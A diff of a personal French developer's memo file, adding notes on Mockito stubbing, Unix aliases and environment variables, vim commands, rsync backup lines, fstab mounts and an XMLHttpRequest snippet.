+    				ServletContext context = mock(ServletContext.class);
+                    ResultDao rd =mock ou spy(unObjetNONANNOTE ou new ResultDao() ou ResultDao.class); mock c'est pour mocker tout l'objet spy c'est pour mocker partiellement l'objet pour mocker qu'une seule methode dans l'objet mais du coup les injections d'autres objets dedans ne se font pas automatiquement et il faut alors utiliser des setters si j'ai besoin d'injecter des trucs dans le spy.
+                    Mockito.doReturn(toto).when(rd).getLaMethodeNONSTATIQUEResult("1"); // retourner toto quand on execute resultdao.getResult("1"); Utiliser ça pour les spy
+    				when(filterConfig.getServNONSTATIQUEletContext( // ca s'appelle faire du "stub" et utiliser ca je crois pour les mock
+    				ou                                   anyString()//tout string
+    				given                                  , eq(Http.GET)// si je peux pas faire "any" je fais ça . si je met des variables direct alors j'ai l'erreur InvalidUseOfMatchersException
+                                                        ,anyList() // ne pas utiliser anyObject si j'ai une liste
+    													,ArgumentMatchers.any(UneClasse.class) avant: Matchers.any(UneClasse.class) avant: anyObject(UneClasse.class)
+    													).thenReturn(untruclapremierefois,unautretruclasecondefois...);
+                                                        ou
+                                                        .thenAnswer(
+                                                                    new Answer<String>() // pour controler les retours conditionnellement LINKmktoanswrweld
+                                                                    {
+                                                                        @Override
+                                                                        public String answer(InvocationOnMock invocationOnMock) throws Throwable
+                                                                        {
+                                                                            if (invocationOnMock.getArgument(0).toString().equals("SOUND_PATH")) return classPath;
+                                                                            else if (invocationOnMock.getArgument(0).toString().equals("ENV")) return "dev";
+                                                                            else return "UTF-8";
+                                                                        }
+                                                                    }
+                    pour indiquer de retourner une exception à un spy ou stub
+                            Mockito.doThrow(new HibernateException("err")).when(userWebDAO).create(Matchers.any(UserWebEntity.class)); 
+    				WelcomeController wc = new WelcomeController(rd);
+    				wc.getDisplayResult("1", "1","10:00", "10/10/2016");
+                    validation verifier qu'un mock a été appelé invoké invoquée par une methode x fois nombre compter combien:
+                            verify(userDetailDAOMock, times(2)).laMathodeDuMock(any(UserDetailsEntity.class));
+
 cucumber : il fait ce que fait junit mais permet à des non techniciens de comprendre les tests.LINKcucumberldfj 
       Feature: action globale
         Scenario: User case label
@@ -24384,7 +24787,7 @@ pour seter setter les variable d'environnement sur unix linux
       si on edite une variable existante: 
         MA_VAR=titi
       mais ca ca ne marche que pour la session du moment. Pour que ca persiste il faut editer sous 
-      $HOME/.profile ou ~/.bash_profile ou /etc/profile   mettre aussi si besion export PATH=.:unpath:$PATH (Je peux le creer si il n'existe pas LINKç'(ç')
+      $HOME/.profile ou ~/.profile ou ~/.bash_profile ou /etc/profile   mettre aussi si besion export PATH=.:unpath:$PATH (Je peux le creer si il n'existe pas LINKç'(ç')
       et recharger avec source pathdufichierquonvientdemodifier 
       exemple pour charger:LINKç'(ç')
               if [ -f ~/.bash_aliases ]; then
@@ -24395,7 +24798,7 @@ les alias sous unix: exemple: alias ll = 'ls -l' ou bien alias ll="ls -l"
     pour voir la liste des alias, tapper alias (permet de voir les raccourcis de commandes)
     pour voir le detail d'un alias: alias nomalias
     pour faire des alias persistants: 
-      vi ~/.bash_alias (ce dernier est charge par ~/.bashrc qui contient) LINKç'(ç')
+      vi ~/.bash_alias (ce dernier est charge par ~/.bashrc qui contient) voir aussi LINKç'(ç')
           alias gototemplate='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/' // pour echapper les espaces: alias gotoapprentissage="cd \"/c/Users/Mes documents/apprendre\""
           alias gotocss='cd /var/www/www.wenhuaduverge.com/shop/themes/wenhuaduvergetheme/css'
           alias gotomodule='cd /var/www/www.wenhuaduverge.com/shop/module'
@@ -24568,7 +24971,7 @@ pour recharger le .profile faire: cd ou cd . puis . .profile (faire ls -tral pou
 pour recharger un environnement faire cd . (la il y a des fichiers environnement(faire ls -tral pour voir tout) dont le nom est par ex: .env_machin) puis . .env_machin ou . ./.env_machin
 pour verifier que "truc" est bien dans l'environnement faire: env | grep truc
 les comptes utilisateurs sont sur etc/password (si un jour un gars qu'on ne connait pas fait des trucs)
-SUPER methode pour trouver les plus gros fichiers: 
+SUPER methode pour trouver les plus gros fichiers: il y a aussi apparemment sur unix baobab l'equivalent de windirstat.  
 du -sk -h * | grep '[0-9\.]\+[M;G]'
 du -sh * c'est mieux c'est plus clair ou du -sh . pour voir la taille du repertoire courant
 du -s -k -h *: permet de voir la taille espace du repertoire courant: en kilo. (-h pour voir si c M ou G ...)
@@ -25032,6 +25435,7 @@ virer le retour chariot de la ligne courante:
 dd: supprimer une ligne (en fait il fait un couper)(copier mais supprime) 
 2dd: supprimer deux lignes  (en fait il fait un couper)
 100dd: supprimer cent lignes (en fait il fait un couper)
+kdgg: supprimer tout avant le curseur en arriere arrière
 D: supprimer à  partir du curseur (en fait il fait un couper je crois) jusqu'à la fin de la ligne
 yy: copier ligne puis P: coller ligne
 4yy puis P: le faire pour 4 lgines
@@ -25364,10 +25768,7 @@ rsync :
                       rsync --ignore-existing -avunr /cygdrive/f/BackupServeurGandiDemeter2/srv/data/var/www/www.wenhuaduverge.com www-data@www.wenhuaduverge.com:/srv/data/var/www/www.wenhuaduverge.com
                   rsync -avu --exclude sons --exclude proc --exclude tmp root@www.wenhuaduverge.com:/srv/data /cygdrive/f/BackupServeurGandiDemeterCASSE/srv/data                                                                                                                                                                                                                                                                                                                                                 
                     Vers Doroty
-                    rsync -vr /cygdrive/f/Mesdocuments/ /cygdrive/e/documents/
-                      rsync -vrn --exclude 'PHOTOS' --exclude 'Karie' --exclude 'theatre' --exclude 'icecream' --exclude 'avance services' --exclude 'AUDIOLOOPPLUS2' --exclude 'AUDIOLOOPPLUS' --exclude 'AH1*' --exclude 'PE1*' --exclude 'ImagesPhotos' --exclude '*.avi' --exclude '*.MOD'  --exclude 'Cakewalk*' --exclude 'Chinoisfacile' --exclude 'IntelliJ IDEA Community Edition 2017.2.2' /media/laurent/OUGARIT/Mesdocuments/ /media/laurent/Doroty/documents/
-                      rsync -vr --exclude 'PHOTOS' --exclude 'Karie' --exclude 'theatre' --exclude 'icecream' --exclude 'avance services' --exclude 'AUDIOLOOPPLUS2' --exclude 'AUDIOLOOPPLUS' --exclude 'AH1*' --exclude 'PE1*' --exclude 'ImagesPhotos' --exclude '*.avi' --exclude '*.MOD'  --exclude 'Cakewalk*' --exclude 'Chinoisfacile' --exclude 'IntelliJ IDEA Community Edition 2017.2.2' --delete /cygdrive/e/Mesdocuments/ /cygdrive/d/documents
-                      rsync -vr --exclude 'PHOTOS' --exclude 'Karie' --exclude 'theatre' --exclude 'icecream' --exclude 'avance services' --exclude 'AUDIOLOOPPLUS2' --exclude 'AUDIOLOOPPLUS' --exclude 'AH1*' --exclude 'PE1*' --exclude 'ImagesPhotos' --exclude '*.avi' --exclude '*.MOD'  --exclude 'Cakewalk*' /cygdrive/e/Mesdocuments/ /cygdrive/d/documents
+                    rsync -vrn --exclude 'PHOTOS' --exclude 'Karie' --exclude 'theatre' --exclude 'icecream' --exclude 'avance services' --exclude 'AUDIOLOOPPLUS2' --exclude 'AUDIOLOOPPLUS' --exclude 'AH1*' --exclude 'PE1*' --exclude 'ImagesPhotos' --exclude '*.avi' --exclude '*.MOD'  --exclude 'Cakewalk*' --exclude 'Chinoisfacile' --exclude 'IntelliJ IDEA Community Edition 2017.2.2' /media/laurent/OUGARIT/Mesdocuments/ /media/laurent/Doroty/documents/
                       rsync -vr --exclude 'testcubase' --exclude '*.au' /cygdrive/f/MaMusique/ /cygdrive/e/Mamusique 
                     sauvegarde de wenhua
                       rsync -vru --exclude 'default-bootstrap' --exclude 'prestashop' --exclude 'prestashopINUTILE' --exclude 'themeconfiguratorINUTILE' --exclude 'wpzoom' --exclude 'zoom' --exclude 'themeconfigurator' --exclude '.htaccess' --exclude 'Install_PrestaShop.html' /cygdrive/f/www/WenhuaDuvergeShop/toutNEW /cygdrive/e/www/WenhuaDuvergeShop/WenhuaDuvergeShop/toutNEW
@@ -25392,7 +25793,6 @@ pour voir les disques (les montages les partitions)
 pour voir les partitions: 
   more /proc/partitions
 montage des disques parametres au lancement sur (ou à une commande mount avec un seul argument: partition ou repertoire)  
-/etc/fstab
     cat /etc/fstab ou bien sudo blkid
       c'est là qu'on declare les montages et lorsqu'on reboot ce fichier est lu pour remonter le volume dans l'arborescence du sys de fichier
       on y voit quelquechose comme:
@@ -25424,9 +25824,6 @@ montage des disques parametres au lancement sur (ou à une commande mount avec u
        umount /srv3 srv3 ne contient plus rien
        umount /srv2 srv2 ne contient plus rien on peut effacer ces deux repertoires
        rmdir srv2, rmdir srv3
-       
-       
-       
        
 changer la taille d'une partition: 
   sur l'interface utilisateur Gandi, changer la taille.
@@ -26778,6 +27175,7 @@ ajax : // xmlhttprequest est remplacé maintenant par fetch (voir LINKsljqffetch
                     xhr.onload = function(e) { // retour du serveur: "e" c'est progressEvent et "this" c'est la reponse du serveur
                             printStacktrace(req.name);
                             askValidator.class_AskValidator.record.call(this);
+                                this.getResponseHeader("Content-type") // on peut recuperer ca et autre...
                               if (this.status == 200) {
                               try
                                 {
